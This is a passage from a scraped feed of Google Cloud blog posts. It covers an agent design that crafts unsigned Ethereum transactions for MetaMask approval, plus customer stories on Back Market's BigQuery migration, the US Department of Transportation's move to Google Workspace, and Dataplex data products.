URL&quot;\\r\\n\\r\\n# (This is the tool function defined in the next section)\\r\\ndef craft_eth_transaction(to_address: str, amount: float, from_address: str, chain_id: int):\\r\\n   # Step 1: Fetch the sender\\&#x27;s next transaction count (nonce)\\r\\n   # Step 2: Determine transaction type (ETH transfer or smart contract call)\\r\\n   # Step 3: Construct the \\&#x27;data\\&#x27; field using ABI\\r\\n   # Step 4: Assemble and return the final, unsigned transaction\\r\\n\\r\\n# The Agent is defined with a simple, non-custodial instruction\\r\\nroot_agent = Agent(\\r\\n   name=&quot;transaction_crafter_agent&quot;,\\r\\n   model=&quot;gemini-2.0-flash&quot;,\\r\\n   description=&quot;An agent that crafts Ethereum transactions for a front-end to send via MetaMask.&quot;,\\r\\n   instruction=(\\r\\n       &quot;You are an agent that crafts ETH transactions. &quot;\\r\\n       &quot;Your only job is to collect the information from the user to craft Ethereum transactions.. &quot;\\r\\n       &quot;The sender\\&#x27;s address will be provided to you as context, along with the chain ID.&quot;\\r\\n       &quot;Use the `craft_eth_transaction` tool to generate the transaction object. &quot;\\r\\n       &quot;The tool will return a JSON object that is ready to be sent to MetaMask. &quot;\\r\\n       &quot;Leave gas and gasPrice fields empty; MetaMask will set them.&quot;\\r\\n       &quot;**IMPORTANT:** After using the tool, you must present the final transaction JSON in the response, formatted exactly like this:\\\\n&quot;\\r\\n       &quot;   ```json\\\\n&quot;\\r\\n       &quot;   {\\\\n&quot;\\r\\n       &quot;     \\\\&quot;to\\\\&quot;: \\\\&quot;0x...\\\\&quot;,\\\\n&quot;\\r\\n       &quot;     \\\\&quot;from\\\\&quot;: \\\\&quot;0x...\\\\&quot;,\\\\n&quot;\\r\\n       &quot;     \\\\&quot;value\\\\&quot;: \\\\&quot;0x...\\\\&quot;,\\\\n&quot;\\r\\n       &quot;     \\\\&quot;nonce\\\\&quot;: \\\\&quot;0x...\\\\&quot;,\\\\n&quot;\\r\\n       &quot;     \\\\&quot;chainId\\\\&quot;: \\\\&quot;0xaa36a7\\\\&quot;\\\\n&quot;\\r\\n       &quot;   }\\\\n&quot;\\r\\n       &quot;   ```\\\\n&quot;\\r\\n   ),\\r\\n   tools=[craft_eth_transaction],\\r\\n)&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12ee9d0880&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">On the client-side, the logic is clean and focused on Web3 interactions. The front-end doesn't need to know anything about large-language models (LLMs) or agent orchestration. It calls the agent's API endpoint (hosted on Google Cloud Run), gets back a standard JSON transaction object, and passes it to MetaMask. </span></p>\n<p><span style=\"vertical-align: baseline;\">ADK's ability to easily run the agent as an API server provides this clean separation of concerns.  The two main functions on the frontend are to extract the transaction from the agent’s response and how to send it to MetaMask. Here’s an example of those functions:  </span></p></div>\n<div class=\"block-code\"><dl>\n    <dt>code_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;code&#x27;, &#x27;/**\\r\\n* Step 1: Process the agent\\&#x27;s response to extract the crafted transaction data.\\r\\n* The agent\\&#x27;s only output is a standard, unsigned transaction object.\\r\\n*/\\r\\nfunction extractTransactionFromAgentResponse(agentEvents) {\\r\\n   const functionResponse = agentEvents.find(\\r\\n       e =&gt; e.content?.parts?.[0]?.functionResponse?.name === \\&#x27;craft_eth_transaction\\&#x27;\\r\\n   )?.content.parts[0].functionResponse;\\r\\n\\r\\n   if (functionResponse?.response?.success) {\\r\\n       // The raw transaction object, ready for the user\\&#x27;s wallet\\r\\n       return functionResponse.response.transaction;\\r\\n   }\\r\\n   return null;\\r\\n}\\r\\n\\r\\n/**\\r\\n* Step 2: Pass the crafted transaction to the user\\&#x27;s wallet for execution.\\r\\n* This function triggers a MetaMask pop-up, putting the user in full control.\\r\\n*/\\r\\nasync function executeMetaMaskTransaction(txData) {\\r\\n   if (!txData || typeof window.ethereum === \\&#x27;undefined\\&#x27;) {\\r\\n       console.error(&quot;Invalid transaction data or MetaMask not found.&quot;);\\r\\n       return;\\r\\n   }\\r\\n\\r\\n   try {\\r\\n       // The \\&#x27;eth_sendTransaction\\&#x27; call asks the wallet to sign and send.\\r\\n       // The private key is never exposed to our web application.\\r\\n       const txHash = await window.ethereum.request({\\r\\n           method: \\&#x27;eth_sendTransaction\\&#x27;,\\r\\n           params: [txData], // txData is the JSON object from the agent\\r\\n       });\\r\\n\\r\\n       console.log(`Transaction sent successfully! Hash: ${txHash}`);\\r\\n       return txHash;\\r\\n\\r\\n   } catch (error) {\\r\\n       // This error typically means the user rejected the transaction in MetaMask.\\r\\n       console.error(&quot;Transaction failed or was rejected by user:&quot;, error);\\r\\n   }\\r\\n}&#x27;), (&#x27;language&#x27;, &#x27;&#x27;), (&#x27;caption&#x27;, &lt;wagtail.rich_text.RichText object at 0x7f12ee9d09a0&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">How the agent confirms intent</span></h2>\n<p><span style=\"vertical-align: baseline;\">While</span><span style=\"vertical-align: baseline;\"> the agent operation is the dialogue with the agent to reach a decision, the MetaMask pop-up is the conclusion of that conversation.</span></p>\n<p><span style=\"vertical-align: baseline;\">Think of it as the digital equivalent of your financial advisor explaining a strategy and then handing you the final document to sign. The signature is the deliberate, necessary confirmation that you understand and consent to the action. It can turn the agent’s recommendation into a reality with your explicit approval, providing crucial peace of mind. Especially given that an agent’s interpretation can vary wildly depending on the underlying LLM, the conversational context, and the data it has access to, it’s always good to check a wallet transaction twice before approval.</span></p>\n<h2><span style=\"vertical-align: baseline;\">MCP servers should serve both realities</span></h2>\n<p><span style=\"vertical-align: baseline;\">The vision of a future where agents autonomously pay other agents for services necessitates the agent-controlled model. Agents in this economy will need their own capital to operate.</span></p>\n<p><span style=\"vertical-align: baseline;\">However, the transaction-crafter model provides a secure bridge to that future. It can be used to safely fund an agent, or to simply execute one-off transactions for simpler operations. This flexibility is key.</span></p>\n<p><span style=\"vertical-align: baseline;\">From a developer’s perspective, adding this capability shouldn’t be a heavy lift. If a MCP server can already prepare and sign a transaction with a key it holds, it should be able to perform the same logic without the final signing step, returning the unsigned transaction instead. This minor change unlocks a much safer and flexible paradigm for users and can even enable more complex designs, like a dedicated “signer agent” in a multi-agent system.</span></p>\n<p><span style=\"vertical-align: baseline;\">Therefore, any robust MCP server designed for broad adoption should provide developers with the flexibility to build applications that can:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Advise and craft for secure, user-centric financial decisions.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Execute with delegated funds for specialized, automated, and clearly defined tasks.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">We recommend pursuing this dual support to foster real innovation while protecting users. </span></p>\n<p><span style=\"vertical-align: baseline;\">You can learn more about </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/build-web3-ai-agents-with-google-cloud?e=48754805\"><span style=\"text-decoration: underline; vertical-align: baseline;\">building Web3 agents using Google Cloud here</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>",
        "published_date": "2025-12-05 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/customers/back-market-migrates-from-snowflake-and-databricks-to-bigquery/",
        "title": "Back Market: Migrating to Google Data Cloud halves data costs and aligns with eco-first priorities",
        "thumbnail": null,
        "author": "Adrien Chaussende",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">At </span><a href=\"https://www.backmarket.com/en-us\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Back Market</span></a><span style=\"vertical-align: baseline;\">, we’re fighting climate change one electronic device at a time.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our digital marketplace connects more than 1,800 sellers of professionally refurbished electronic devices — from smartphones and computers to home appliances and gaming consoles — with buyers looking for a good deal. We’re proud to be able to say that since 2014, we’ve averted the emission of 2 million tons of CO</span><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: sub;\">2</span></span><span style=\"vertical-align: baseline;\"> by helping more than 17 million customers purchase refurbished electronics that work just as well as new ones.</span></p>\n<p><span style=\"vertical-align: baseline;\">But our carbon-conscious business model poses an interesting IT challenge: Behind every website is a carbon-emitting IT infrastructure of CO</span><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: sub;\">2</span></span><span style=\"vertical-align: baseline;\">-producing data centers. To combat this, our IT team began to rethink its vendor-agnostic IT strategy. Being able to cherry-pick technologies from any provider was appealing initially, but this wasn’t scalable as the company grew.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our tech stack was built on Amazon Web Services (AWS) and included Snowflake and Databricks. This created a fragmented data landscape where information was scattered across different platforms. Complex workflows enabled us to write data to various destinations. But </span><a href=\"https://cloud.google.com/bigquery\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BigQuery</span></a><span style=\"vertical-align: baseline;\"> was the primary one used by all our teams. This meant we were maintaining expensive, performance-draining pipelines for destinations that provided no real value. As a result of juggling disparate technologies, our small engineering team was amassing more and more technical debt.</span></p>\n<p><span style=\"vertical-align: baseline;\">We had recently migrated all our data to BigQuery, which functions as our company’s enterprise data platform. So when we made the decision to migrate to a managed services model, </span><a href=\"https://cloud.google.com/?hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud</span></a><span style=\"vertical-align: baseline;\"> was the natural choice. Our </span><a href=\"https://www.bcorporation.net/en-us/certification/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">B Corp commitment</span></a><span style=\"vertical-align: baseline;\"> also made Google Cloud’s </span><a href=\"https://sustainability.google/reports/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">carbon footprint transparency and renewable energy options</span></a><span style=\"vertical-align: baseline;\"> particularly appealing.</span></p>\n<p><span style=\"vertical-align: baseline;\">Our long-term relationship with Google Cloud also played a role. This time, we were not only migrating our data platform, we were moving the company’s entire tech stack. The trust we’d established over the years made us comfortable with our choice to unify our data and IT operations on Google Cloud.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A double-run strategy for a super-smooth data migration</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Working closely with our team at Google, we built a proof of concept in just two weeks, choosing certain data center locations specifically because they run on renewable energy sources. This proof of concept involved a dedicated team of Google experts working alongside Back Market specialists across infrastructure, database administration, data engineering, security, and backend development. The ambitious goal was to create a clone of our pre-production environment running entirely on Google Cloud within two weeks — and we achieved it.</span></p>\n<p><span style=\"vertical-align: baseline;\">The core of our migration strategy was to consolidate our diverse data storage systems by making BigQuery the single place for all our historical, raw, and data model needs. This would eliminate the complexity of managing Databricks and Snowflake as part of our previous AWS-based tech stack.</span></p>\n<p><span style=\"vertical-align: baseline;\">Together we decided on a live double-run migration approach. This involved keeping production running on Databricks while simultaneously writing data to clone tables in BigQuery. We continuously compared the resulting data imports between the old Databricks flows and the new BigQuery setup. Once we were confident that the outputs were identical, we switched off the old pipelines.</span></p>\n<p><span style=\"vertical-align: baseline;\">BigQuery now houses all data relating to our business operations: sales, pricing, ecommerce, ordering and delivery, supply chains, and products. In addition, marketers can use third-party data collected from marketing channels and automation platforms to assess the performance of marketing campaigns. For analytics and data engineering teams, the data in BigQuery helps build out and track KPIs — including, importantly, the overall amount of CO</span><span style=\"vertical-align: baseline;\"><span style=\"vertical-align: sub;\">2 </span></span><span style=\"vertical-align: baseline;\">emitted by IT operations.</span></p>\n<p><span style=\"vertical-align: baseline;\">Because the user interface for accessing BigQuery data remained the same, the switchover didn’t disrupt the workflow of business-side users. The migration could not have gone more smoothly: We got the most critical components of our stack up and running exclusively on Google Cloud in just six months.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Accelerated dataflows, improved productivity, and lower costs</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Among the most critical components of our migration was transitioning our change data capture (CDC) pipeline from AWS Database Migration Service to </span><a href=\"https://cloud.google.com/datastream?hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google Cloud Datastream</span></a><span style=\"vertical-align: baseline;\"> while maintaining our serverless architecture approach.</span></p>\n<p><span style=\"vertical-align: baseline;\">However, since Datastream produces numerous small files per minute, it can become costly to merge them one by one into BigQuery. To address this, we implemented hourly batching for cost optimization: Instead of processing each small file individually, we batch these files hourly before loading them into BigQuery.</span></p>\n<p><span style=\"vertical-align: baseline;\">The final data flow architecture works seamlessly. Transactional data flows from our </span><a href=\"https://cloud.google.com/products/alloydb?hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AlloyDB</span></a><span style=\"vertical-align: baseline;\"> databases through a proxy to Datastream, which writes the data to Cloud Storage. From there, the batching and transformation process is orchestrated using </span><a href=\"https://cloud.google.com/composer?hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Cloud Composer</span></a><span style=\"vertical-align: baseline;\"> via Kubernetes pods, which triggers hourly transformations of the data. After being transformed, the data is finally loaded into BigQuery.</span></p>\n<p><span style=\"vertical-align: baseline;\">Back Market’s decision to move to Google’s Data Cloud has had a measurable impact on performance, costs, and productivity. Simplifying the setup with Datastream alone lowered CDC costs by 90%, while Google Cloud’s streamlined, integrated data cloud has cut our data processing speeds in half. Instead of paying for machines that need to start up and maintain overhead, queries run directly, eliminating idle time and the overhead of maintaining virtual machines.</span></p>\n<p><span style=\"vertical-align: baseline;\">Fewer components in a unified ecosystem also translates into better observability of the entire tech stack, improved data governance, and easier-to-manage permissioning and access privileges. And a managed service with fewer components means fewer incidents, less maintenance, and diminished complexity. Onboarding is faster, knowledge-sharing is less complicated, and our team can focus on higher-value tasks like developing new products and features.</span></p>\n<p><span style=\"vertical-align: baseline;\">Today we rely on Google Cloud instead of building and maintaining infrastructure from scratch. Google Cloud has enabled our entire team to shift its mindset from focusing on internal technology to adding value to our own products and business.</span></p>\n<p><strong style=\"font-style: italic; vertical-align: baseline;\">Ready to get started?</strong></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Google Cloud offers a comprehensive set of AI-powered </span><a href=\"https://cloud.google.com/solutions/data-migration\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">BigQuery Migration Services</span></a><span style=\"font-style: italic; vertical-align: baseline;\">. Get started with a free assessment today.</span></p></div>",
        "published_date": "2025-12-05 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/public-sector/driving-the-future-of-government-us-department-of-transportation-selects-google-workspace-as-new-agency-wide-collaboration-suite/",
        "title": "Driving the future of government: U.S. Department of Transportation selects Google Workspace as new agency-wide collaboration suite",
        "thumbnail": null,
        "author": "Jim Kelly",
        "track": null,
        "description": "<div class=\"block-paragraph\"><p>The U.S. government is rapidly transforming how it operates, driven by the need for greater efficiency, enhanced security, and the powerful integration of artificial intelligence (AI) into public service delivery. The U.S. Department of Transportation (DOT) recently achieved a significant milestone that exemplifies this commitment to modernization: becoming the first cabinet-level agency to fully transition its workforce away from legacy providers to <a href=\"https://workspace.google.com/lp/business/?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=1710046-Workspace-DR-NA-US-en-Google-BKWS-EXA-na&amp;utm_content=c-Hybrid+%7C+BKWS+-+EXA+%7C+Txt-Google+Workspace-Core-346911454270&amp;utm_term=google%20workspace&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=20159848966&amp;gclid=CjwKCAiA8vXIBhAtEiwAf3B-g7Vgh6VP56_C10SKOdxojZ10LNQ8EHtVygop4hpfvBmpOtyvTy1wkhoCSCcQAvD_BwE\" target=\"_blank\">Google Workspace</a> with Gemini, using the General Services Administration (GSA) <a href=\"https://www.gsa.gov/about-us/newsroom/news-releases/gsa-secures-cost-savings-through-strategic-agreement-with-google-04102025\" target=\"_blank\">OneGov Strategy</a>.</p><p>More than 50,000 DOT employees, including those from all transportation modes – ranging from the Federal Aviation Administration (FAA) to the National Highway Traffic Safety Administration (NHTSA) – will be able to take advantage of Workspace’s modern suite of cloud-based productivity and collaboration tools, including apps like Gmail, Docs, Drive, and Meet to help employees securely connect, create, and collaborate. More than 12,000 users have access today, with 40,000 more coming on in 2026.</p><p>This is a major step forward to support DOT’s mission to ensure the United States has the safest, most efficient, and modern transportation system in the world. The successful execution of this transformation, in partnership with Google Public Sector and GSA, demonstrates how forward-thinking federal leadership is actively embracing best-in-class commercial innovation to better serve the public. Through this collaborative effort, the team was able to deploy the foundational system and migrate initial users to Workspace in just 22 days.</p><h3><b>Breaking from a legacy technology past</b></h3><p>Like many federal agencies, the DOT stood at a critical juncture. Legacy technology providers continued to offer outdated solutions, loaded with expensive add-ons for AI. In addition, years of <a href=\"https://www.cisa.gov/sites/default/files/2025-03/CSRBReviewOfTheSummer2023MEOIntrusion508.pdf\" target=\"_blank\">costly breaches</a> – in part due to outdated software architectures – made it clear that some technology vendors did not prioritize security or a security-first culture.</p><p><a href=\"https://www.transportation.gov/briefing-room/icymi-secretary-duffy-op-ed-zero-100-days-how-donald-trump-revolutionizing#:~:text=Safety%20and%20efficiency%20are%20not,overbearing%20bureaucracy%20and%20outdated%20technology.&amp;text=Duffy%20highlights%20USDOT's%20First%20100,%2D%2D%2D\" target=\"_blank\">As U.S. Transportation Secretary Sean P. Duffy underscored</a> earlier this year, “Safety and efficiency are not mutually exclusive, and we need a government that’s lean, futuristic, and bold enough to build big without the baggage of an overbearing bureaucracy and outdated technology.” Faced with these challenges, the agency sought a secure, cost-effective, and AI-forward platform to power its mission.</p><p>Leveraging GSA’s OneGov Strategy, DOT secured Workspace’s advanced capabilities required for its critical mission. This move aligns directly with the vision articulated in President Donald Trump’s <a href=\"https://www.whitehouse.gov/wp-content/uploads/2025/07/Americas-AI-Action-Plan.pdf\" target=\"_blank\">America’s AI Action Plan</a> and executive orders on <a href=\"https://www.federalregister.gov/documents/2025/06/11/2025-10804/sustaining-select-efforts-to-strengthen-the-nations-cybersecurity-and-amending-executive-order-13694\" target=\"_blank\">cybersecurity</a> and <a href=\"https://www.federalregister.gov/documents/2025/04/18/2025-06835/ensuring-commercial-cost-effective-solutions-in-federal-contracts\" target=\"_blank\">commercial technology</a>, demonstrating that agencies can – and should – prioritize competitive access to the private sector’s most advanced solutions.</p><h3><b>AI and innovation as an engine for the workforce</b></h3><p>Employees across the DOT workforce are now equipped with our most intelligent AI models with <a href=\"https://deepmind.google/models/gemini/\" target=\"_blank\">Gemini</a>, as well as powerful tools like <a href=\"https://notebooklm.google/?gad_source=1&amp;gad_campaignid=22476587015&amp;gbraid=0AAAAA-fwSscbtizgwMIEhaVoEfolIWaxZ&amp;gclid=CjwKCAiA8vXIBhAtEiwAf3B-g7kRnv5cCb-22JPS4cBaAuItS_iBXd5bB_I3NOjtkPwN-qHojUW_BxoC6_EQAvD_BwE\" target=\"_blank\">NotebookLM</a>, integrated seamlessly into their daily workflows.</p><p>For example, employees can now leverage NotebookLM to rapidly synthesize complex research for executive briefings, while Gemini streamlines contracting and communications. And, with the addition of <a href=\"https://chromeenterprise.google/products/chrome-enterprise-premium/?utm_source=adwords&amp;utm_medium=cpc&amp;utm_campaign=2025-h2-premium-chromebrowser-paidmed-paiddisplay-other-chromebrowserent&amp;utm_term=chrome-enterprise-premium&amp;utm_content=GCPM&amp;brand=GCPM&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=19746200608&amp;gbraid=0AAAAADJomwdNmHgW4QOoF7zAJkhi0j8DH&amp;gclid=CjwKCAiA8vXIBhAtEiwAf3B-g19eVA32832G6HAMtxxepnmMviXhxEorePjJdPqPSOaEzQXbGMVSSxoCLeIQAvD_BwE#windows-tab\" target=\"_blank\">Chrome Enterprise Premium,</a> the agency gains long-awaited BYOD (Bring Your Own Device) capabilities, offering employees the flexibility to securely use any mobile or PC device they choose in the workplace. With AI integrated across Google Workspace, all staff can work smarter and faster, directly strengthening the safety and reliability of our nation’s transportation systems.</p><h3><b>Enhancing the standard for trust and resilience</b></h3><p>Security and compliance are paramount to DOT’s mission. The DOT has provided a successful model for how to achieve maximum security standards without compromising capability. By choosing a unified, cloud-native platform – including Workspace Enterprise Plus complemented by Assured Controls Plus for 100% U.S.-based support – the DOT is able to reinforce its cybersecurity posture against modern threats. As Google Workspace, Gemini in Workspace apps and the Gemini app are <a href=\"https://cloud.google.com/blog/topics/public-sector/gemini-in-workspace-apps-and-the-gemini-app-are-first-to-achieve-fedramp-high-authorization?e=48754805\">FedRAMP High authorized</a>, we meet the government's most rigorous security standards—empowering agencies like the DOT to adopt cutting-edge generative AI without compromising on data sovereignty.</p><p>This comprehensive approach, supported by Google's Professional Services Organization (PSO) and our partner Daston Corporation, demonstrates a commitment by the DOT to ensure its employees enjoy a seamless transition to Workspace. The team is also leveraging best practices for training and change management, including both remote and in-person support, helping employees to redesign their workflows using Gemini, and hosting engaging office-hours sessions to share top tips and tricks.</p><h3><b>A new blueprint for federal excellence</b></h3><p>The leadership demonstrated by Secretary Duffy and the DOT team creates a clear blueprint for cabinet-level peers. Technology modernization can be made without compromising security, with integrated, best-in-class AI that empowers the public service workforce.</p><p>We are committed to supporting the DOT’s digital transformation and stand ready to help other federal leaders across the government adopt this blueprint for their own mission successes.</p><p><a href=\"https://cloudonair.withgoogle.com/events/public-sector-summit-2025\" target=\"_blank\">Check out the highlights from our recent Google Public Sector Summit</a>, where public sector organizations gathered to share how they are applying the latest Google AI and security technologies to advance their missions.</p></div>",
        "published_date": "2025-12-05 11:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/data-analytics/introducing-data-products-in-dataplex-universal-catalog/",
        "title": "Introducing data products in Dataplex Universal Catalog for curated data and context",
        "thumbnail": null,
        "author": "George Verghese",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Many organizations are overwhelmed with large amounts of fragmented data and are unclear on how it impacts their business objectives. This creates a critical disconnect: data consumers — analysts or data scientists that need the data to generate insights — can’t easily discover, access, or trust the data they need, while data producers — the teams who own these data assets — can’t enable consumers with self-service access to that data. Without easy access to reliable, context-rich data, organizations can struggle to adopt AI and agent technologies. </span></p>\n<p><span style=\"vertical-align: baseline;\">To help organizations overcome these challenges, we are introducing </span><strong style=\"vertical-align: baseline;\">data products</strong><span style=\"vertical-align: baseline;\"> in </span><a href=\"https://cloud.google.com/dataplex\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Dataplex Universal Catalog</span></a><span style=\"vertical-align: baseline;\">, Google Cloud’s unified, intelligent data to AI governance solution. A data product is a curated, ready-to-use package of data assets, documentation, and governance controls, all purposefully assembled to solve a specific business problem. More than just data, data products can help you demonstrate business value and fuel AI innovation within your organization. Data products are available now in </span><a href=\"https://docs.cloud.google.com/dataplex/docs/data-products-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">preview</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Understanding data products</strong></h3>\n<p><span style=\"vertical-align: baseline;\">At its core, a data product is </span><strong style=\"vertical-align: baseline;\">a logical unit of distribution that models how a group of assets address a business problem. </strong><span style=\"vertical-align: baseline;\">We</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">think of it as a product on a shelf, complete with a label, instructions, and quality guarantees, but for data. It abstracts raw data assets into trusted, discoverable, and valuable resources for the entire organization. This allows data teams to more efficiently</span><span style=\"vertical-align: baseline;\">:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Define expectations:</strong><span style=\"vertical-align: baseline;\"> Instead of answering the same ad-hoc questions again and again, data producers can catalog information about data quality, freshness, and intended use cases directly within the data product's documentation and contracts.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Reduce management toil:</strong><span style=\"vertical-align: baseline;\"> Data products allow you to group assets logically by use case. This simplifies access management, reducing the manual effort required to manage individual assets.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Demonstrate value:</strong><span style=\"vertical-align: baseline;\"> By linking data assets directly to the business use cases they serve, data teams can clearly demonstrate the value they create and justify their budget spend based on impact, not just history. </span></p>\n</li>\n</ul>\n<h3><strong style=\"vertical-align: baseline;\">How to use data products</strong></h3>\n<p><span style=\"vertical-align: baseline;\">At a high level, data products deliver the following foundational capabilities:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Design for use case</strong><span style=\"vertical-align: baseline;\">: Identify the business problem and model the data product to solve for a use case.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Establish ownership</strong><span style=\"vertical-align: baseline;\">: Define the ownership of the data product to ensure accountability. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Democratize context</strong><span style=\"vertical-align: baseline;\">: Document the problems the product addresses with usage examples and expectations. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Define contracts</strong><span style=\"vertical-align: baseline;\">: Provide trust to consumers and communicate contractual guarantees. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Govern assets</strong><span style=\"vertical-align: baseline;\">: Administer who can view the product and regulate access to the data assets. </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Enable discovery</strong><span style=\"vertical-align: baseline;\">: Help data consumers easily discover and request access for data products.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Evolve offerings</strong><span style=\"vertical-align: baseline;\">: Iterate and evolve the product to address consumer needs.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">What does that mean in practice? Imagine you're a data producer for a marketing team. Data consumers  such as data scientists in your organization consistently need to analyze quarterly campaign performance to recommend future adjustments. Here’s how you can empower them with a \"Marketing campaign analysis\" data product:</span></p>\n<ol>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Create the data product:</strong><span style=\"vertical-align: baseline;\"> Start by creating a new data product named \"Marketing campaign analysis.\" You assign yourself as the owner and provide contact details.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Curate cross-project assets:</strong><span style=\"vertical-align: baseline;\"> You then add the relevant assets needed for the analysis. For example you can include BigQuery tables and views</span><strong style=\"vertical-align: baseline;\">:</strong><span style=\"vertical-align: baseline;\"> </span><code style=\"vertical-align: baseline;\">ad_spend_daily</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">customer_conversions</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">website_traffic_logs</code><span style=\"vertical-align: baseline;\">.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Define roles and permissions:</strong><span style=\"vertical-align: baseline;\"> To govern and manage access on the assets in your data product, create a </span><code style=\"vertical-align: baseline;\">data_scientist</code><span style=\"vertical-align: baseline;\"> group and grant this group </span><code style=\"vertical-align: baseline;\">viewer</code><span style=\"vertical-align: baseline;\"> access on all of the assets.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Establish a data contract:</strong><span style=\"vertical-align: baseline;\"> To build trust, specify the refresh frequency of data products and communicate the contract terms.</span></p>\n</li>\n<li><strong style=\"vertical-align: baseline;\">Add rich documentation:</strong><span style=\"vertical-align: baseline;\"> Finally, add a detailed description explaining that this data product is the single source of truth for campaign analysis. You include examples of SQL queries and links to additional artifacts.</span></li>\n</ol></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/2_iHEbgqr.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Image 1: Data Producers create data products by packaging assets, permissions, contract and context</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Now, the data scientist can simply search for \"campaign analysis,\" find this data product, request access, and immediately have everything they need to do their job, confident in the data's quality and origin.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_ms12IGK.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Image 2: Data consumers discover data products, understand context and request access to them</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\"><em><span style=\"vertical-align: baseline;\">\"With Google Cloud's Data Products, we are advancing our data sharing 